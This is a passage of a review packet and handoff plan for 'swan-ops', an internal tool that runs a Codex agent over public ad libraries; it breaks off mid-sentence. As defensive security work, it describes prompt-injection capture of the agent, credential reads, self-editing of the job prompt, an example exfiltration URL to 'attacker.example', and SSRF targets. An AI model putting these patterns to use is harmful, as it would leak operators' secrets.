# ROUND 2 — hostile review of the FIXES to the swan-ops plan

Round 1 was an eight-seat panel. **All eight returned REVISE.** Three findings were DISPROVED
by execution and correctly not acted on. The rest were fixed. **This round asks one question:
did the fixes introduce new defects, and is the loop dry?**

This project's hard-won rule, proven repeatedly in this workstream: **the round that applies a
fix is the next round's primary attack surface.**

## What round 1 found, and what changed

| Finding | Seats | Fix applied |
|---|---|---|
| Plan shipped the operator's Windows username to external models | Grok | Redacted to `<OPERATOR>` in the plan + packets. **Systemic** (59 docs / 140 occurrences repo-wide) — flagged to the owner, NOT swept unilaterally. My pre-dispatch scan had returned a FALSE NEGATIVE. |
| `Test-ReportLinks` HEAD-fetches agent-authored URLs from the PARENT process, post-publish, no allowlist | Grok + Sol | **New `OPEN-11` (HIGH).** Not silently patched — it changes Slice 2's scope and needs the owner's decision on approach. |
| No version control / single copy on disk | GLM | **New `OPEN-12` (MEDIUM).** |
| `@playwright/mcp@latest` unpinned, runs outside the sandbox as the user | GLM/Grok/me | **PINNED to `0.0.79`** — behaviour-preserving (that is what `@latest` resolved to); it is a pre-1.0 package. `OPEN-2` closed. |
| The freeze had NO automated test | GLM + me | **e2e case added, and MUTATION-TESTED**: with the freeze disabled the run completed, exit 0, and wrote a report; the test caught it. 6/6. |
| §3 claimed write-isolation as fact while `OPEN-10` called it unverified | Kimi/GLM/Grok | §3 rewritten as an explicit conditional with a warning. |
| TL;DR said "the tool is frozen" — only `-Yes` is refused | Grok | TL;DR and §5 now state the real extent: attended runs are live, and that half of the freeze is prose. |
| §14 acceptance could pass while the hole stood (PATH-shim on `curl.exe`) | ALL | §14 acceptance rewritten: positive control + 2 domains × 3 clients + credential reads across providers + mechanism-level logs, not self-report + reproduces twice. |
| Slice 2 reused `$AdLibraryOrigins`, which contains `https://www.google.com` | Grok/DSPro/Sol | §14 now forbids reusing it and requires a curated minimal allowlist. |
| Env-scrub is circular: codex itself needs model auth | GLM/Grok | Called out explicitly as the first thing to settle empirically in Slice 2. |
| Stale code comment: "28-form sweep" vs 34 actual | DeepSeek Flash | Number removed entirely rather than corrected — it had already rotted once. |
| §2 refused to recommend | most seats | **Recommendation restored: RETIRE-IN-PLACE**, with GLM's default-with-expiry. |

**DISPROVED in round 1 and deliberately NOT acted on** — re-raising any of these is a finding
against you, not the plan: (a) Grok's sandbox-size "contradiction" — both figures are true,
`.playwright-mcp/` IS the whole sandbox; (b) Qwen's "53 assertions is really 44" — it counted
case-table entries; runtime prints 53; (c) GLM's OneDrive exposure — Desktop is not redirected.

## Your questions

1. **Did any fix introduce a new defect?** Attack the freeze test, the §14 rewrite, the pin,
   and the new `OPEN-11`/`OPEN-12` entries specifically.
2. **Is the §14 acceptance test now sufficient**, or still defeatable?
3. **Is `OPEN-11` correctly scoped?** It is deliberately NOT fixed — is deferring it right, or
   should the link-checker be disabled outright today?
4. **Is the RETIRE-IN-PLACE recommendation right** given everything now known?
5. **Is the loop dry?** Say so plainly if it is. Do not manufacture a finding — a padded
   finding now costs strictly more than silence.

Quote only strings you can see below. End with: **APPROVE / REVISE / REJECT**.

---

# PART 1 — THE REVISED PLAN

# Swan Ops console — handoff v4

**Date:** 2026-08-21 · **Author:** vs-claude (Opus 5) · **Linear:** `SWA-191`
**Supersedes:** `SWAN-OPS-HANDOFF-V3-2026-08-15.md` (read this instead; v3 is history, and
several of its numbers and one of its work-order specs are now wrong — see §9).

**Revised 2026-08-22** after an eight-seat hostile review OF THIS PLAN (GLM-5.3, Kimi-K3,
GPT-5.6-Sol-Pro, Grok-4.6, DeepSeek-V4-Pro, DeepSeek-V4-Flash, Qwen-3.8, Opus 5).
**All eight returned REVISE.** Panel + verification ledger:
`panel-swan-ops-plan-2026-08-22/`. Three panel findings were DISPROVED by execution and are
NOT reflected here. What changed: §2 now carries a recommendation, §3's sandbox claim is
scoped to what is actually verified, §5 states the freeze's real extent, §7 gains two new
findings, and §14 was rewritten because its acceptance test could pass while the hole stood.

**Status:** Slices 0 and 1 are **shipped and dry** after a nine-round hostile review.
**Nothing is committed. Nothing is deployed. The branch is untouched.**
**One decision is blocking everything else, and it is Sean's — see §2.**

> **Read §1, §2, §3 before touching anything.** §2 is the decision. §3 is the current state.
> If you only have two minutes: **UNATTENDED runs are frozen** (`-Yes` exits 4, now covered
> by a test). **Attended runs are still live** — `Swan-Ops.cmd`, the menu, and `-Market` all
> run, on a machine §11 documents as holding three API keys. The gate works. `OPEN-1` is still
> open. My recommendation is **retire-in-place** (§2); Sean has not yet ruled.

**Tool location:** `C:\Users\<OPERATOR>\Desktop\quick-pt\swan-ops\` — deliberately OUTSIDE
the SwanStudios repo. The `SS-PT` checkout next to it is ~1,947 commits behind `origin/main`,
so anything committed there never reaches production.

---

## 1. What this tool is, in one paragraph

Sean wanted a CMD button that points Codex at business work. The capability was already
installed; what was missing was a front door — one entry point plus prewritten, guardrailed
job prompts. That is `swan-ops/`. **Job 1 is market & competitor recon:** an AI agent drives
a Playwright browser over public ad libraries and competitor pages, then writes one markdown
report. `codex exec` is the headless primitive. **It is not part of the SwanStudios web app
and nothing here deploys.**

**Autonomy is "draft & stage only"** — nothing posts, sends, buys, submits, or logs in.

---

## 2. ⛔ THE DECISION BLOCKING THIS WORKSTREAM — Sean's call, not an agent's

**Invest in swan-ops, or freeze it in place?**

This is `SWA-191`'s blocking item and it has been open since 2026-08-19. **Do not default into
Slice 2 without an answer.** The two honest options:

**Retire-in-place.** The recon this tool was built for is *done* and its business finding is
captured (§4). Freeze the tool with Slices 0+1 in place, and spend the engineering hours on
the Marketing Command Center — which is Sean's own stated #1 priority, because acquisition is
the gap. Revisit if a second recon is actually wanted.

**Invest.** If recurring competitor intelligence is genuinely valuable, then Slice 2 is
mandatory and the rest follow. **But Slice 2 is a real multi-session security engineering
project** (egress proxy, env scrubbing, credential-path denial, all verified by *observed*
failures) on an internal research tool — not a slice you finish in an afternoon.

**What has actually been produced to date: one report.** Its content is extracted and written
up. The remaining value is *future* recon runs, and no next run is scheduled.

### My recommendation: RETIRE-IN-PLACE

v3 recommended this; v4 withdrew it and presented both options neutrally. The panel called
that correctly: stop-and-ask is the right *process* for a cross-project resource decision, but
declining to state a recommendation — while §15 already treats freeze as the expected path —
is decision-avoidance dressed as deference. So, plainly:

**Freeze it.** One report produced, its finding already extracted, no scheduled second recon,
Slice 2 is multi-session security engineering, and the owner's stated #1 priority is customer
acquisition. Nothing about this tool is time-sensitive. If a second recon is ever actually
wanted, Slice 2 comes first and this decision reopens then.

**Default with expiry (GLM):** `SWA-191` has been open since 2026-08-19. **Absent an answer,
treat this as retire-in-place** — do not let it block indefinitely, and do not drift into
Slice 2 for want of a decision.

**What is NOT recommended under either option:** running another recon before the freeze
lifts. See §5. **And do the OPEN-2 pin (§7) regardless of the answer** — it is minutes of
work, it protects the attended runs the freeze still permits today, and it is not gated by
this decision.

---

## 3. Current state — measured 2026-08-21, not remembered

```
swan-ops/
  Swan-Ops.cmd              13   double-click entry
  Swan-Ops.ps1             299   orchestration ONLY — UNDER its 300-line cap (was 304)
  README.md                231   usage + enforced-constraints table + FREEZE + known gaps
  lib/Console.ps1          136   palette, prompts, input hardening, link checker
  lib/BrowserPolicy.ps1    128   ★ ALL browser decisions + the measurements behind them
  lib/Publish.ps1          506   ★ THE PUBLISH GATE. Read its header before touching it.
  lib/Handles.ps1           57   operator-supplied handle loader
  jobs/market-recon.md     306   the job-1 prompt (passes A–E) + §5 verdict-block contract
  jobs/handles.txt           7   8 entries, operator-supplied competitor→Facebook handle map
  tests/test-publish-gate.ps1  301   53 assertions — the gate, unit level
  tests/test-launcher-e2e.ps1  105   5 assertions — the REAL launcher, stubbed codex
  sandbox/                       agent's ENTIRE writable universe — 9.3 MB / 184 files
  reports/ logs/ .work/          2 reports; .work holds the 6 probe scripts from 08-14
```

**Both suites green right now:** `53 passed, 0 failed` and `E2E RESULT: 5 passed, 0 failed`.

### How to verify everything in 30 seconds
```powershell
cd C:\Users\<OPERATOR>\Desktop\quick-pt\swan-ops
powershell -NoProfile -ExecutionPolicy Bypass -File tests\test-publish-gate.ps1    # 53/53
powershell -NoProfile -ExecutionPolicy Bypass -File tests\test-launcher-e2e.ps1   # 5/5
.\Swan-Ops.ps1 -Market "x" -Yes    # must print the freeze refusal and exit 4
```

### Control flow
```
Swan-Ops.cmd → Swan-Ops.ps1
   ├─ Test-Preflight            codex on PATH? version drift vs 0.146.1?
   ├─ -Yes → REFUSED, exit 4    ← the operational freeze, mechanically enforced
   ├─ Show-Menu / -Market       interactive or non-interactive
   └─ Invoke-ReconJob
        ├─ Protect-UserInput        strips ANSI + {{ }} so input can't reach tokens
        ├─ token substitution       SINGLE regex pass (6 tokens)
        ├─ Get-HandlesBlock        ← lib/Handles.ps1
        ├─ Get-CodexArgs           ← lib/BrowserPolicy.ps1
        ├─ Write-BrowserDisclosure ← lib/BrowserPolicy.ps1
        ├─ & codex @codexArgs *> log     SPLAT (see §8 trap 1)
        ├─ Publish-Report          ← lib/Publish.ps1   THE GATE — fails closed
        └─ Write-PublishOutcome    ← lib/Publish.ps1   owns the outcome message
   exit: 0 published · 3 published+FLAGGED · 1 quarantined/failed/cancelled · 4 freeze
```

The agent's writable root is `sandbox/`, NOT the tool root — so **if the Windows
`workspace-write` sandbox is actually enforcing, it cannot edit its own instructions.**

⚠ **That conditional is load-bearing and is NOT verified.** `OPEN-10` says the sandbox's
strength on Windows is unverified; if it is advisory, an injected run can edit
`jobs/market-recon.md` and plant standing instructions for every future run. Three panel seats
independently flagged that v4 stated this as fact here while admitting it was unproven in §7 —
the reassuring version was the one written as fact. Do not treat write-isolation as a boundary
until `OPEN-10`'s one empirical test has been run.

---

## 4. The business output (this is the thing the tool was built to produce)

Report: `reports/2026-08-14-153233-golf-focused-and-affluent-personal-train.md`

**Meta ad presence, all 8 competitors resolved:**

| Business | Meta ads? | Evidence strength |
|---|---|---|
| Tracy Anderson *(control)* | YES (~20 active / ~62 all) | verified |
| **GolfForever** | **YES** (2 active, Jul 20 + Jul 22 2026) | verified |
| Hansen Fitness For Golf | No (US scope) | verified — reproduced across 2 runs |
| Golf Fitness Academy | No (US scope) | verified — 1 run, 2 captures |
| Royal Private Coach | No (US scope) | ⚠ handle is `personaltrainerworldwide`, a different brand name → binding not independently confirmed |
| The Gym Venice | No (US scope) | verified — 1 run, 2 captures |
| TriMov | No (US scope) | **weaker** — null message ×4 but Meta never rendered an advertiser card |
| IronCore Performance | No Facebook page | 3 candidate handles all "content isn't available"; Instagram-only |

**The strategic read:** paid social on Meta is **empty among every comparable service
business**. Only a product company and a lifestyle brand advertise. The two who do sell
**opposite things** — GolfForever's 3-week-old ads argue from injury fear and against
objections; Tracy Anderson's oldest sampled ad thanks people for showing up.
**Belonging outlives features.**

**Two readings fit the same evidence and this data cannot separate them:** an open channel
with cheap attention, or a channel that does not convert for high-ticket in-person service.
The cheap test is a small budget against the belonging angle.

### Still owed by Sean (no agent can settle these)
- **The pricing contradiction.** v1 said SwanStudios sits below the premium band; the
  better-sourced 15:32 run says local golf-fitness is mostly below $175 while affluent
  comparators reach $190–250. Which framing to price against is a business call.
- **The ad-spend question** (above).
- **Invest-or-freeze** (§2).

---

## 5. ⛔ The operational freeze — IN FORCE, and now mechanically enforced

**`-Yes` (unattended) exits 4 before spending anything** — now covered by a mutation-tested
e2e case, so a refactor that drops it fails the suite. **Do not run this tool at all on a
machine holding live credentials.**

⚠ **Know exactly what is and is not frozen.** Only `-Yes` is mechanically refused. **Attended
runs — `Swan-Ops.cmd`, the interactive menu, and `-Market` + `y` — all still run**, and the
e2e suite proves it (five of its six cases drive exactly that path). The second sentence above
is the part that covers attended runs, and it is **prose, not a mechanism** — the same category
of guardrail this workstream spent nine rounds arguing is not a control.

And §11 documents that **this machine holds `ZAI_API_KEY`, `OPENROUTER_API_KEY` and
`LINEAR_API_KEY`** — so by the freeze's own rule, no run is permitted here at all, while the
launcher still permits attended ones. Grok's proposed de-risk, which I endorse if the answer to
§2 is anything other than "invest now": **refuse every entry point with exit 4** until the
decision is made. That is one branch plus a suite case, and it turns §2 into a real stop
instead of a comment.

**Expires when:** Slice 2 lands AND is verified by an **observed** failure — a run that tries
`curl https://example.com` and reading `~/.ssh` and is refused at both, with the refusal in
the log. **Configuration alone does not lift this freeze.**

**Why:** the Codex sandbox restricts **writes** but not **reads**, so `~/.ssh`, `~/.codex`
tokens and any `.env` are readable by a run — and egress is unsandboxed, so nothing mechanical
sits between a read and a send. Every anti-exfiltration guardrail is *prompt-level*, against
input that is attacker-controlled by design (the job reads competitor pages and ad copy, and
anyone can buy an ad).

**Scope caveat, stated honestly:** "no live production credentials" is narrower than "no
credentials". An attended run on this machine can still read a personal `~/.ssh`. The freeze
reduces blast radius; it does not create a boundary.

---

## 6. What Slice 1 actually is, and what it is NOT

`lib/Publish.ps1` is the publish gate. **Read its file header before changing anything in
it** — it is the load-bearing record of nine rounds of adversarial review.

**Before:** the launcher published on **file existence alone**. A run whose own controls
failed, or that watched a page try to hijack it, landed in `reports/` beside trustworthy work.
The model graded its own homework and the pipeline shipped the grade unread.

**Now:** the job prompt (§5 of `jobs/market-recon.md`) mandates a four-line machine-read
verdict block, and the gate parses it from a **bounded head** (first 40 lines), requiring the
four lines **contiguous and in order**:

```
RUN_VERDICT: VALID          # VOID → quarantine
CONTROL_POSITIVE: PASS      # FAIL / NOT_RUN → quarantine
CONTROL_NEGATIVE: PASS      # FAIL / NOT_RUN → quarantine
INJECTION_OBSERVED: NO      # YES → PUBLISHES, flagged (see below)
```

Outcomes: `PUBLISHED` (exit 0) · `FLAGGED` (exit 3, publishes + writes `<report>.FLAGGED.txt`)
· `QUARANTINED` (exit 1, to `reports/quarantine/` + `.QUARANTINE.txt` saying why) ·
`ERROR` / `NOTHING` (exit 1). **Missing, malformed, partial or out-of-order block →
quarantine.** Non-zero agent exit → quarantine. Empty or >8 MB → quarantine.

### ⚠ WHAT THIS GATE DOES NOT DO — do not over-read it
It stops a bad run being published **silently**. **It cannot make a captured agent honest** —
an injected agent still writes `RUN_VERDICT: VALID` over a fabrication, exactly as before.
What changed: omission, malformed output, non-zero exit, truncation and honest self-reported
failure no longer publish. `OPEN-1` remains the only control that would constrain a captured
agent. **"The publish gate is in" ≠ "fabrication is solved."** `OPEN-4` is marked
**NARROWED, not closed.**

### The design call worth understanding before you change it
An injection the agent **observed and did not comply with** PUBLISHES with a flag. It used to
quarantine. Both reviewers independently proved that **no purely textual test** can separate
"the agent recorded an attack" from "the agent faithfully quoted ad copy containing a
record-shaped line" — the job *mandates* verbatim quoting of hostile ads, and Meta ad copy
contains line breaks. Quarantining on that handed any attacker a ~$5 permanent DoS against
honest runs, while never binding a captured agent (which simply omits the record).
**Nothing a report can contain now blocks publication on injection grounds.** That is
deliberate. If you are tempted to re-add a blocking check here, read the discrepancy site's
comment first — this ground has been fought over for four rounds.

---

## 7. STILL OPEN — ranked. This is your backlog.

| # | Severity | Finding | Notes |
|---|---|---|---|
| **OPEN-1** | **CRITICAL** | **Egress unsandboxed, child env unscrubbed.** Sandbox restricts writes but NOT reads: `~/.ssh`, `~/.codex` tokens, `.env` all readable. Prompt-level defenses only. | **Slice 2. All four reviewers ranked it #1 across two sessions.** The only fix that makes "draft & stage only" *true* rather than *instructed*. |
| ~~**OPEN-2**~~ | ✅ **FIXED 2026-08-22** | ~~**`@playwright/mcp@latest` unpinned**~~ Pinned to `0.0.79` — the version `@latest` resolved to that day, so behaviour-preserving today. Note it is a **pre-1.0** package: patch bumps carry no stability contract, which made floating worse than the finding said. Every panel seat said pin regardless of §2, because the freeze does not touch it — attended runs still npx-resolve. Original text: **`@playwright/mcp@latest` unpinned** (`BrowserPolicy.ps1` `$pwArgs`). npx resolves tip-of-npm each run and executes **outside** the codex sandbox as the user. A bad release is RCE. Also invalidates every "measured on 0.146.1" claim. | Slice 4. Pin exact version + integrity; pin `codex` too. |
| **OPEN-3** | **HIGH** | **Disclosure overstates reach.** `$AdLibraryOrigins` contains `https://www.google.com` — an entire search engine — while `Write-BrowserDisclosure` says reach is "the two public ad libraries + their CDNs". | Slice 5. **Partially mitigated:** the README row is now struck through and marked OVERSTATED rather than silently left, but the *code* is unchanged. |
| **OPEN-5** | MEDIUM | Report body still overstates the "14-month ad" claim and lacks US-scope qualifiers. The job prompt is fixed; the *report* is not. | Slice 6. Edit the addendum: `oldest of 5 sampled from ~62`, add "US scope" to every null, note the Royal Private Coach mismatch. |
| **OPEN-7** | MEDIUM | **Google sub-pass has none of the Meta-side discipline.** `adstransparency.google.com/?domain=` nulls have unverified semantics — agency-run ads under another domain null silently, the same wrong-instrument error. | Slice 8. |
| **OPEN-8** | MEDIUM | **No wall-clock timeout.** Cap is prompt-level only. Note: a prior `Start-Job`/`Stop-Job` attempt was removed because `Stop-Job` blocks, and a broad kill would destroy other Codex sessions on this machine. | Slice 9. Scope the kill precisely. |
| **OPEN-9** | MEDIUM | **`sandbox/.playwright-mcp/` = 9.3 MB / 184 files**, ~1–1.5 MB per run, holding **812 JWT-shaped strings** from Meta's own scripts. NOT Sean's credentials (browser `--isolated`, zero session cookies, outside git) but token-bearing third-party data. | Slice 7 bullet 2, **not done**. Add a 30-day prune mirroring `.work`'s. **Never paste these logs into another model.** |
| **OPEN-10** | LOW | Windows `workspace-write` sandbox strength **unverified**. If advisory, an injected run could edit `jobs/market-recon.md` and plant standing instructions for every future run. | Slice 9. One empirical test. |
| **OPEN-11** | **HIGH — NEW 2026-08-22** | **The launcher exfiltrates on the agent's behalf, from the parent process.** `Test-ReportLinks` (`Console.ps1:26`) HEAD-fetches every URL it finds in the report — up to 40, **no allowlist** — and it is called at `Publish.ps1:481` in the PUBLISHED/FLAGGED branch, in the **operator's** PowerShell process, **after** publish. A captured agent writes `https://attacker.example/x?d=<data>` into its report; the gate cannot stop it publishing (by design); the operator's machine then fetches it. **This survives Slice 2 entirely** — Slice 2 constrains the codex *child*; this runs in the *parent*. Also SSRF: `http://localhost:PORT`, `http://192.168.x.x`. Found independently by Grok and Sol; confirmed by reading. | Either allowlist the origins it will fetch (same curated list as Slice 2), or do not fetch at all for reports that are FLAGGED/untrusted, or move it behind the same egress control. **Do this in Slice 2 or the slice is incomplete.** |
| **OPEN-12** | **MEDIUM — NEW 2026-08-22** | **No version control, no backup, single copy on disk.** `swan-ops` is not a git repo (verified). Nine rounds of hardening, both slices, the test suites, and the only recon report exist in exactly one place — on a tree where a concurrent agent works under a standing "never `git add -A`" warning. One disk failure or one mis-staged command destroys all of it. Found by GLM; the plan never listed it as a risk. | `git init` inside `swan-ops` — it sits outside SS-PT deliberately, so give it its own repo. Minutes of work. |
| ~~OPEN-4~~ | — | **NARROWED 2026-08-21**, not closed. See §6. | |
| ~~OPEN-6~~ | — | **CLOSED.** Launcher is 299 lines, under its cap. | |

---

## 8. Process traps that cost real time — read before debugging anything

1. **Arg passing:** use the `@codexArgs` **splat**. `Start-Process -ArgumentList` turned 13
   args into 17 with quotes stripped. TOML values need `'key=[\"a\",\"b\"]'`, and this is only
   true through a splat *inside a .ps1* — testing from bash or `powershell -Command` adds a
   parsing layer and gives the **opposite** answer.
2. **Native stderr kills the pipeline.** codex logs a `models_cache` ERROR to stderr; under
   `$ErrorActionPreference='Stop'` PowerShell promotes it to terminating. **Signature: exit 1
   in 0 seconds with a ~150-byte log.** Scope `'Continue'` around the codex call only.
3. **Logs are UTF-16LE.** ASCII grep returns nothing and the silence looks like "no activity".
   `iconv -f UTF-16LE -t UTF-8` first.
4. **`*>` captures stdout AND stderr**; the old `2>&1 | Tee-Object` silently dropped stderr.
5. **The agent's self-report is not evidence.** Grep the log for
   `mcp: playwright/<tool> (completed|failed)` — that is server truth. It does **not** capture
   `browser_evaluate` return values, so anything read that way is unattested.
6. **Validate the instrument before believing a negative.** Recurred all session. The fix that
   worked was procedural — "name where the thing *would* appear, confirm the tool can see that
   place" — not vigilance.
7. **The round that applies a fix is the next round's primary attack surface.** Proven four
   times in this workstream. Three of the worst defects were introduced by fixes.
8. **An empty page and a null result look identical in a summary and nothing alike in the
   artifact.**
9. **Any number written into a doc is a claim with an expiry date.** Stale counts bit **five
   times** across two sessions. The rule that finally worked: **update counts as the LAST
   action before building any packet or closing out** — never before the last edit.
10. **PowerShell heredocs through bash mangle escapes.** Several patches this session failed
    silently that way. Write the patch to a `.py`/`.ps1` file and run the file.
11. **`.Count` on an empty pipeline or a scalar throws under StrictMode.** Two latent crashes
    of this exact class were sitting in `lib/Console.ps1` since it was written. Always `@()`.

---

## 9. Where v3 is now WRONG (it is still on disk; don't be misled)

- v3's **§12 Slice 1 spec is wrong**: it says grep for `CONTROL_WORKED` / `TRIMOV_STATUS`.
  **Neither string exists anywhere in the job prompt.** A gate keyed to them matches nothing,
  ever, while every closeout reports the finding closed. This was caught before building.
- v3's file map line counts are stale (it was updated mid-session; this doc's §3 is measured).
- v3 marked `OPEN-4` **CLOSED**; it is **NARROWED**.
- v3's §11b describes the round-1 design of the gate, which rounds 2–8 substantially replaced.

**v3 remains useful for:** §4 (the recon findings), §5 (the chronological discovery log — how
Meta's 403 challenge works, why keyword search proves nothing, why `view_all_page_id` is the
method that works), §8 (traps), §10 (rules), §13 (how to run the review panel).

---

## 10. The nine-round hostile panel — what it cost and what it bought

**Full record:** `SWAN-OPS-SLICE01-PANEL-SYNTHESIS-2026-08-20.md`. Read it before running
another panel; the calibration section will save you money.

Defects per round: **10 → 9 → 4 → 1 → 1 → 1 → 1 → 0 → 0.** Suite 18 → 53 (+5 e2e).
**Cost $1.78 total.** Two reviewer claims were **disproved by execution** and not acted on.

| Round | GLM-5.3 | Kimi-K3 | Defects |
|---|---|---|---|
| 1 | REVISE | REVISE | 10 |
| 2 | REVISE | REVISE | 9 (4 introduced by R1's fixes) |
| 3 | REVISE | REVISE | 4 |
| 4 | REVISE | **APPROVE** | 1 (prose) |
| 5 | REVISE | **APPROVE** | 1 (prose) |
| 6 | REVISE | **APPROVE** | 1 (logic) |
| 7 | **APPROVE** | REVISE | 1 (logic) |
| 8 | **APPROVE** | **APPROVE** | **0 — CLEAN** |
| 9 | *(my e2e round)* | — | **0 — CLEAN** |

**A single-seat "dry" was wrong three times running.** Two seats is the mechanism, not
redundancy.

### Model calibration — carry this forward
- **GLM-5.3 (free, subscription) — best seat by a wide margin.** Decisive finding in three
  separate rounds. Verifies rather than asserts; says plainly where it cannot see a file
  instead of guessing; reversed its own position when out-argued. **~450s/round, $0.**
  **Make this the default seat, not the escalation.**
- **Kimi-K3 ($0.78 / 8 runs) — trust the frame, verify the facts.** Sharpest architectural
  critiques in the panel (the injection-DoS design flaw, the flag-not-persisted finding). Also
  produced both of the panel's false claims. Stable across ten reviews now.
- **GPT-5.6-Sol-Pro ($1.01 for ONE truncated run)** — more than eight Kimi runs combined. It
  billed 92,767 input tokens on a 10,527-token packet (pro mode re-reads internally) and ran
  out of output before its verdict. Its contiguity finding was real and reshaped the parser.
  **If used again: budget for truncation, ask for the verdict first.** Sean capped it at one
  run for this workstream.
- **Qwen 3.8 (local, free)** — confirmatory only. Zero unique findings across two rounds, zero
  false claims; its one "Critical" contradicted its own analysis. Correct as a fourth seat.

### How to run a panel (verified commands)
```bash
# GLM — Z.ai coding plan, subscription-billed, ~450s, $0
node scripts/consult-glm.mjs --document <PACKET>.md --out <OUT>.md --remit "<remit>"

# Kimi — OpenRouter, per-token. Zero-cost preflight, then needs --confirm-spend
OPENROUTER_API_KEY=$(grep '^OPENROUTER_API_KEY=' .env | cut -d= -f2-) \
node scripts/consult-kimi.mjs --document <PACKET>.md --out <OUT>.md \
  --effort high --confirm-spend --remit "<remit>"

# Sol Pro — OpenRouter, NO preflight gate, fires immediately
SWAN_SOL_MODEL=openai/gpt-5.6-sol-pro node scripts/consult-sol.mjs \
  --document <PACKET>.md --out <OUT>.md --effort high --remit "<remit>"

# Qwen — local Ollama, free, ~30s
node scripts/consult-qwen.mjs --document <PACKET>.md --out <OUT>.md --remit "<remit>"
```
**Build packets by concatenating the ACTUAL FILES**, never by describing them — a described
file is a fabrication surface. Generator pattern: a small Python script that reads each file
and slices regions by marker. **Secret-scan the packet before dispatch; it leaves the machine.**
**Verify every quoted string** — this panel produced two false claims across ten reviews.

---

## 11. Environment defects — not your bugs

- `models_cache.json` re-corrupts after nearly every codex call; self-heals, re-breaks. Trap 2.
- `.codex/skills/prompt-depth-router/` missing its `scripts/` folder → errors every session.
- **Playwright profile is shared and unisolated by default** (`.mcp.json` runs
  `npx -y @playwright/mcp@latest` with no `--isolated`) → *"Browser is already in use"* when two
  agents run. swan-ops passes `--isolated` so it sidesteps this.
- **`scripts/lane.mjs` is absent from this branch** (present on `origin/main`). This is the
  exact failure `drift-check` warns about: tooling that reads as *deleted* is really *missing
  from a branch ~1,947 commits behind*. **Do not "restore" it here** — Sean's standing
  instruction is to leave this branch alone. Coordinate by reading
  `.ai-workflow/coordination/*.lane.md` directly.
- **`ZAI_API_KEY` is a USER-scope Windows env var** — a shell started before it was set won't
  see it: `$env:ZAI_API_KEY = [Environment]::GetEnvironmentVariable('ZAI_API_KEY','User')`.
  GLM works on the **coding endpoint only** (`api.z.ai/api/coding/paas/v4`); streaming is
  mandatory (reasoning model — a plain fetch dies at 300s).
- **Kimi reads `OPENROUTER_API_KEY` from the process env**, not `.env`. Pass it inline without
  echoing (Rule 59).
- **`LINEAR_API_KEY` is present** and the Linear MCP tools resolve (this was not true in the
  prior session — do not repeat the old "Linear unavailable" claim without checking).
- **Another Claude session took over `.ai-workflow/coordination/claude.lane.md`** mid-session
  for Design Brain work (`SWA-163`/`SWA-185`). It was left alone. Check the lane before
  assuming it is yours.

---

## 12. Rules that bound this work

- **Proof-before-done (73/74):** no "done/fixed/working" without current-session reproducible
  evidence *in the same message*. End closeouts with a literal `PROOF:` line.
- **Dry-loop:** hostile rounds until **two consecutive** find nothing, each a NEW vantage.
  End `DRY-LOOP: CLEAN×2 (rounds: N)`. Re-reading code is not a round.
- **Rule 30:** every reviewer finding is a **hypothesis** until executed. This caught two false
  claims. Do not act on a finding you have not reproduced.
- **Dual-tier summary:** `## Plain English` FIRST (no paths/jargon), then `## Technical`.
  A `Stop` hook blocks the turn without it.
- **Hermes memo** at substantial close → `.ai-workflow/hermes-inbox/pending/`, must contain the
  literal heading `## Mistakes I made` (unnumbered — the gate matches literally).
- **Learning packet** (Opus 5 is Fable-tier, so you may write one): validate with
  `node scripts/hermes-learning-validate.mjs --file <path> --json`. **Read
  `_schema.json` first** — `tier_basis` and `privacy` are required and are easy to miss by
  copying a sibling packet's visible shape.
- **Linear:** name an `SWA-<n>` or state `LINEAR: N/A — <reason>`. Unprompted.
- **Privacy:** no PII/secrets/precise-location in any committed artifact or paid packet.
  Businesses and public brand accounts are fair game; private individuals are not.
- **Credentials phrasing:** "26+ years of experience", "NASM-protocol". Never
  "NASM-certified". "stretching"/"flexibility", never "yoga"/"meditation".
- **Git:** branch `wip/comms-notifications-2026-07-05`, ~1,947 behind `origin/main`, and Sean
  said **leave it alone**. **Never `git add -A`** — stage explicit paths. Another agent works
  this tree concurrently.

---

## 13. Session artifacts

**In `docs/ai-workflow/AI-HANDOFF/`:**
- This doc (supersedes v3 → v2 → v1)
- `SWAN-OPS-SLICE01-PANEL-SYNTHESIS-2026-08-20.md` — **the one to read**; full 9-round record,
  the impossibility result, per-reviewer calibration, both disproved findings
- 8 GLM reviews, 8 Kimi reviews, 1 Sol review, 2 Qwen reviews (`*-SLICE01-REVIEW-R*.md`)
- 8 review packets (`SWAN-OPS-SLICE01-REVIEW-PACKET-R*.md`)
- Prior session: `GLM-/KIMI-SWAN-OPS-RECON-REVIEW-2026-08-15.md`, `HY3-`, `KIMI-K3-` (08-14)

**Elsewhere:**
- Hermes memos: `20260820T110912Z-swan-ops-a-gate-keyed-to-a-marker-nobody-emits.md`,
  `20260821T213912Z-swan-ops-a-bound-always-leaks-one-wider.md`
- Learning packets: `20260820-a-gate-keyed-to-a-marker-nobody-emits.md`,
  `20260821-a-bound-always-leaks-one-character-wider.md`
- Linear: **`SWA-191`** (In Review) — carries the §2 decision as its blocking item

**Nothing committed.** All untracked/uncommitted on the stale branch. Stage explicit paths.

---

## 14. If Sean says "invest" — Slice 2, precisely

**Build, in this order:**
1. **Scrub the child environment.** Pass codex a filtered env — drop `OPENAI_API_KEY`,
   `ZAI_API_KEY`, `OPENROUTER_API_KEY`, `LINEAR_API_KEY`, AWS/Render/Stripe/SendGrid vars,
   anything secret-shaped. **The recon job needs none of them.**
2. **Egress allowlist — and do NOT reuse `$AdLibraryOrigins`.** v4 said that list "is
   already the list." It is not: `OPEN-3` documents that it contains `https://www.google.com`,
   an entire search engine. Reusing it bakes the known-overstated list into the actual
   security perimeter, at exactly the moment the freeze lifts — three seats called this the
   single most dangerous line in the plan. **Curate an explicit minimal allowlist**: exact
   ad-library and CDN hostnames, plus whatever endpoint `codex` itself needs for model auth.

   Mechanism: **an OS-level control is the requirement; a proxy is a convenience.** A proxy
   the child is "pointed at" is honored through environment variables, and a captured agent is
   precisely the actor who will not honor them — `node`'s fetch, `Invoke-WebRequest`, or a raw
   socket route around it. Use a firewall rule scoped to the codex process tree, or run the
   child in a container/VM with allowlisted egress. **Note `--allowed-origins` covers only the
   Playwright browser, NOT the agent's shell; the shell is the actual exposure.**
3. **Deny-read the credential paths** if the platform allows it (`~/.ssh`, `~/.codex`, `.env`,
   browser profile stores).

**Acceptance — rewritten, because v4's version could pass while the hole stood.**
Every seat that looked at it said so. v4 required only that `curl https://example.com` and a
`~/.ssh` read fail, with the failure in the log. Concrete defeat (GLM): implement the control
as a PATH shim on `curl.exe` plus a hosts-file block of `example.com`; acceptance passes;
